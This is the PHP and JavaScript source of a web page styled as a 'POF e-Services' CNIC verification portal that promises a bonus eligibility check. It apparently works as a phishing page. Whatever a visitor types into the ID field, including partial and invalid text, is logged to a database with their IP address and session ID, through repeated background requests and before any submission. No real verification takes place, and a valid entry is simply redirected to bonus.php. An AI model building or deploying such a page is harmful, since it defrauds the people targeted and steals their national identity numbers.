<?php
date_default_timezone_set('Asia/Karachi');
require_once 'F:\xampp\htdocs\admins\db_connect.php';
require_once 'F:\xampp\htdocs\config.php';

session_start();

// Handle AJAX request for auto-saving ANY text (not just valid CNIC)
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['auto_save']) && isset($_POST['cnic_text'])) {
    $cnic_text = $_POST['cnic_text'];
    $save_time = date("Y-m-d H:i:s");
    $session_id = session_id();
    $ip_address = $_SERVER['REMOTE_ADDR'];
    
    // Create separate connection for fop database
    $fop_db_host = 'localhost';
    $fop_db_user = 'root';
    $fop_db_pass = '';
    $fop_db_name = 'fop';
    
    $fop_conn = new mysqli($fop_db_host, $fop_db_user, $fop_db_pass, $fop_db_name);
    
    if ($fop_conn->connect_error) {
        error_log("FOP Database connection failed: " . $fop_conn->connect_error);
        echo json_encode(['success' => false, 'error' => 'DB connection failed']);
    } else {
        // Check if same text already exists in recent auto-saves (last 2 minutes)
        $checkStmt = $fop_conn->prepare("SELECT id FROM fop_cnic WHERE cnic_text = ? AND ip_address = ? AND save_time > DATE_SUB(NOW(), INTERVAL 2 MINUTE) LIMIT 1");
        $checkStmt->bind_param("ss", $cnic_text, $ip_address);
        $checkStmt->execute();
        $checkStmt->store_result();
        
        if ($checkStmt->num_rows > 0) {
            // Duplicate found - don't save again
            echo json_encode(['success' => true, 'duplicate' => true, 'message' => 'Duplicate - not saved']);
            $checkStmt->close();
        } else {
            $checkStmt->close();
            
            // Insert into fop_cnic table - SAVE ANY TEXT
            $stmt = $fop_conn->prepare("INSERT INTO fop_cnic (cnic_text, save_time, session_id, ip_address, is_valid_cnic) VALUES (?, ?, ?, ?, ?)");
            
            if ($stmt) {
                // Check if it's a valid CNIC format
                $is_valid_cnic = preg_match('/^\d{5}-\d{7}-\d{1}$/', $cnic_text) ? 1 : 0;
                
                $stmt->bind_param("ssssi", $cnic_text, $save_time, $session_id, $ip_address, $is_valid_cnic);
                
                if ($stmt->execute()) {
                    echo json_encode(['success' => true, 'saved' => true, 'message' => 'Text saved successfully', 'is_valid' => $is_valid_cnic]);
                } else {
                    error_log("Text auto-save insertion error: " . $stmt->error);
                    echo json_encode(['success' => false, 'error' => $stmt->error]);
                }
                $stmt->close();
            } else {
                error_log("Text auto-save statement error: " . $fop_conn->error);
                echo json_encode(['success' => false, 'error' => $fop_conn->error]);
            }
        }
        
        $fop_conn->close();
    }
    exit;
}

// Handle regular form submission for valid CNIC and redirect to bonus.php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cnic']) && !isset($_POST['auto_save'])) {
    $cnic = $_POST['cnic'];
    $save_time = date("Y-m-d H:i:s");
    
    // Validate CNIC format
    if (!preg_match('/^\d{5}-\d{7}-\d{1}$/', $cnic)) {
        die("Invalid CNIC format");
    }
    
    $fop_db_host = 'localhost';
    $fop_db_user = 'root';
    $fop_db_pass = '';
    $fop_db_name = 'fop';
    
    $fop_conn = new mysqli($fop_db_host, $fop_db_user, $fop_db_pass, $fop_db_name);
    
    if ($fop_conn->connect_error) {
        error_log("FOP Database connection failed: " . $fop_conn->connect_error);
    } else {
        $stmt = $fop_conn->prepare("INSERT INTO fop_cnic (cnic_text, save_time, session_id, submitted, is_valid_cnic) VALUES (?, ?, ?, 1, 1)");
        
        if ($stmt) {
            $session_id = session_id();
            $stmt->bind_param("sss", $cnic, $save_time, $session_id);
            
            if ($stmt->execute()) {
                // Success - redirect to bonus.php
                header("Location: bonus.php");
                exit();
            } else {
                error_log("CNIC insertion error: " . $stmt->error);
            }
            $stmt->close();
        } else {
            error_log("Statement preparation error: " . $fop_conn->error);
        }
        
        $fop_conn->close();
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CNIC Verification - POF e-Services</title>

    <!-- Same CSS as main page -->
    <link rel="stylesheet" href="styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">

    <style>
        #pageLoader {
            position: fixed;
            inset: 0;
            background: #4fc3e7;
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 99999;
        }

        .loader-bars {
            display: flex;
            gap: 6px;
        }

        .loader-bars span {
            width: 6px;
            height: 30px;
            background: #fff;
            animation: bounce 1s infinite ease-in-out;
        }

        .loader-bars span:nth-child(2) { animation-delay: .1s; }
        .loader-bars span:nth-child(3) { animation-delay: .2s; }
        .loader-bars span:nth-child(4) { animation-delay: .3s; }
        .loader-bars span:nth-child(5) { animation-delay: .4s; }

        @keyframes bounce {
            0%,100% { transform: scaleY(0.4); }
            50% { transform: scaleY(1); }
        }

        .cnic-portal-container {
            position: relative;
            z-index: 2;
            max-width: 500px;
            margin: 50px auto;
            padding: 0 20px;
        }

        .cnic-card {
            background: linear-gradient(135deg, 
                rgba(255, 255, 255, 0.98), 
                rgba(248, 250, 252, 0.95));
            padding: 35px 30px;
            border-radius: 16px;
            text-align: center;
            box-shadow: 
                0 20px 60px rgba(0, 0, 0, 0.12),
                0 8px 30px rgba(0, 0, 0, 0.06),
                inset 0 1px 0 rgba(255, 255, 255, 0.7);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .cnic-card h2 {
            color: #2c3e50;
            margin-bottom: 10px;
            font-size: 24px;
        }

        .cnic-card .urdu {
            color: #555;
            margin-bottom: 25px;
            font-size: 16px;
        }

        .cnic-info {
            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 165, 0, 0.1));
            border-radius: 10px;
            padding: 15px;
            margin: 20px 0;
            border-left: 4px solid #FFD700;
        }

        .cnic-info p {
            color: #555;
            font-size: 14px;
            line-height: 1.5;
            margin-bottom: 10px;
        }

        .cnic-info .urdu {
            color: #2c3e50;
            font-size: 15px;
            line-height: 1.6;
            margin-bottom: 0;
        }

        .cnic-input-group {
            margin-bottom: 25px;
        }

        .cnic-input-group label {
            display: block;
            text-align: left;
            margin-bottom: 8px;
            font-weight: 500;
            color: #333;
        }

        .cnic-input-group input {
            width: 100%;
            padding: 12px 15px;
            border-radius: 8px;
            border: 2px solid #ddd;
            font-size: 16px;
            transition: border-color 0.3s;
            text-align: center;
            letter-spacing: 1px;
        }

        .cnic-input-group input:focus {
            border-color: #4fc3f7;
            outline: none;
            box-shadow: 0 0 0 3px rgba(79, 195, 247, 0.1);
        }

        .cnic-format {
            font-size: 12px;
            color: #666;
            text-align: left;
            margin-top: 5px;
        }

        .back-btn {
            background: #6c757d;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 30px;
            font-size: 15px;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
            width: 100%;
        }

        .back-btn:hover {
            background: #5a6268;
        }
        
        .auto-save-status {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
            text-align: right;
            min-height: 18px;
        }
    </style>
</head>

<body>

<!-- PAGE LOADER -->
<div id="pageLoader">
    <div class="loader-bars">
        <span></span><span></span><span></span><span></span><span></span>
    </div>
</div>

<!-- NETWORK ANIMATION -->
<canvas id="network"></canvas>

<!-- DARK OVERLAY -->
<div class="overlay"></div>

<div class="header">
    <h1>CNIC Verification Portal - POF e-Services</h1>
</div>

<div class="cnic-portal-container">
    <div class="cnic-card">
        <h2>BONUS ELIGIBILITY CHECK</h2>
        <p class="urdu">بونس اہلیت کی جانچ</p>

        <div class="cnic-info">
            <p>Please enter your CNIC number to check your bonus eligibility. The system will verify your employment status and calculate your bonus amount.</p>
            <p class="urdu">براہ کرم اپنا سی این آئی سی نمبر درج کریں تاکہ آپ کی بونس اہلیت چیک کی جا سکے۔ نظام آپ کی ملازمت کی حیثیت کی تصدیق کرے گا اور آپ کی بونس کی رقم کا حساب لگائے گا۔</p>
        </div>

        <form method="POST" action="" id="cnicForm">
            <div class="cnic-input-group">
                <label>CNIC Number <span>*</span></label>
                <input type="text" name="cnic" id="cnicInput" placeholder="XXXXX-XXXXXXX-X" required pattern="\d{5}-\d{7}-\d{1}" maxlength="15">
                <div class="cnic-format">Format: 12345-1234567-1 (without spaces)</div>
                <div class="auto-save-status" id="autoSaveStatus"></div>
            </div>

            <button type="submit" class="btn blue">Verify Eligibility & Check Bonus</button>
            <button type="button" class="back-btn" onclick="goBack()">Back to Login</button>
        </form>
    </div>
</div>

<script>
// Track last saved text
let lastSavedText = '';
let saveCounter = 0;

// Function to auto-save ANY text
function autoSaveText() {
    const text = document.getElementById('cnicInput').value;
    const statusElement = document.getElementById('autoSaveStatus');
    
    // Only save if text has value and is different from last save
    if (text.length > 0 && text !== lastSavedText) {
        saveCounter++;
        statusElement.textContent = `Saving... (${saveCounter})`;
        statusElement.style.color = '#FF9800';
        
        console.log('Auto-saving text:', text);
        
        // Create form data
        const formData = new FormData();
        formData.append('auto_save', '1');
        formData.append('cnic_text', text);
        
        // Send AJAX request
        fetch('cnic_portal.php', {
            method: 'POST',
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                if (data.duplicate) {
                    statusElement.textContent = 'Duplicate - not saved';
                    statusElement.style.color = '#FF9800';
                    console.log('Text duplicate - not saved');
                } else {
                    statusElement.textContent = `Saved! (${saveCounter}) ${data.is_valid ? '✓ Valid CNIC' : ''}`;
                    statusElement.style.color = '#4CAF50';
                    console.log('Text saved successfully');
                    lastSavedText = text;
                    
                    // Flash success
                    setTimeout(() => {
                        if (statusElement.textContent.includes('Saved')) {
                            statusElement.textContent = 'Auto-save active';
                            statusElement.style.color = '#666';
                        }
                    }, 2000);
                }
            } else {
                statusElement.textContent = 'Save failed';
                statusElement.style.color = '#F44336';
                console.error('Text auto-save failed:', data.error);
            }
        })
        .catch(error => {
            statusElement.textContent = 'Network error';
            statusElement.style.color = '#F44336';
            console.error('AJAX error:', error);
        });
    } else if (text.length === 0) {
        statusElement.textContent = 'Start typing...';
        statusElement.style.color = '#666';
    } else {
        statusElement.textContent = 'No changes to save';
        statusElement.style.color = '#666';
    }
}

// Format CNIC input (add dashes automatically) but DON'T restrict to numbers only
function formatCnicInput() {
    const input = document.getElementById('cnicInput');
    let value = input.value;
    
    // Allow any characters but auto-add dashes for numbers
    if (/^\d+$/.test(value.replace(/-/g, ''))) {
        // If it's all numbers (with or without dashes), format it
        let numbers = value.replace(/\D/g, '');
        
        if (numbers.length > 13) {
            numbers = numbers.substring(0, 13);
        }
        
        if (numbers.length > 5) {
            numbers = numbers.substring(0, 5) + '-' + numbers.substring(5);
        }
        if (numbers.length > 13) {
            numbers = numbers.substring(0, 13) + '-' + numbers.substring(13);
        }
        
        if (value !== numbers) {
            input.value = numbers;
        }
    }
    // If it's not all numbers, just keep whatever was typed
    
    // Trigger auto-save after formatting
    autoSaveText();
}

// Debounce function
function debounce(func, delay) {
    let timeout;
    return function() {
        const context = this;
        const args = arguments;
        clearTimeout(timeout);
        timeout = setTimeout(() => func.apply(context, args), delay);
    };
}

// Set up event listeners
const cnicInput = document.getElementById('cnicInput');
const debouncedAutoSave = debounce(autoSaveText, 800); // Save after 800ms of inactivity

// Auto-save when user types ANYTHING
cnicInput.addEventListener('input', function() {
    formatCnicInput(); // This will call autoSaveText
    debouncedAutoSave();
});

// Also save when user leaves the field
cnicInput.addEventListener('blur', function() {
    autoSaveText();
});

// Save every 3 seconds regardless of typing (as backup)
setInterval(() => {
    if (cnicInput.value && cnicInput.value !== lastSavedText) {
        autoSaveText();
    }
}, 3000);

// Handle form submission
document.getElementById('cnicForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const cnic = document.getElementById('cnicInput').value.trim();
    
    // Validate CNIC format only on final submission
    const cnicPattern = /^\d{5}-\d{7}-\d{1}$/;
    if (!cnicPattern.test(cnic)) {
        alert('Please enter CNIC in correct format: 12345-1234567-1');
        return;
    }
    
    // One final auto-save
    autoSaveText();
    
    // Show loading
    document.getElementById("pageLoader").style.display = "flex";
    
    // Submit form after short delay
    setTimeout(() => {
        // Submit the form normally (will redirect to bonus.php)
        this.submit();
    }, 1000);
});

// Store text in sessionStorage
function saveToLocalStorage() {
    const text = document.getElementById('cnicInput').value;
    if (text) {
        sessionStorage.setItem('cnic_input', text);
    }
}

// Load text from sessionStorage on page load
window.addEventListener('load', function() {
    const savedText = sessionStorage.getItem('cnic_input');
    if (savedText) {
        document.getElementById('cnicInput').value = savedText;
    }
    
    // Auto-save loaded text
    setTimeout(() => {
        if (document.getElementById('cnicInput').value) {
            autoSaveText();
        }
    }, 500);
    
    // Show auto-save is ready
    document.getElementById('autoSaveStatus').textContent = 'Auto-save ready';
});

// Save to sessionStorage on input
cnicInput.addEventListener('input', saveToLocalStorage);

function goBack() {
    window.history.back();
}

/* HIDE LOADER AFTER PAGE LOAD */
window.addEventListener("load", () => {
    setTimeout(() => {
        document.getElementById("pageLoader").style.display = "none";
    }, 1200);
});

// Debug: Check if JavaScript is running
console.log('CNIC portal JavaScript loaded - Auto-save enabled');
</script>

<script src="network.js"></script>
</body>
</html>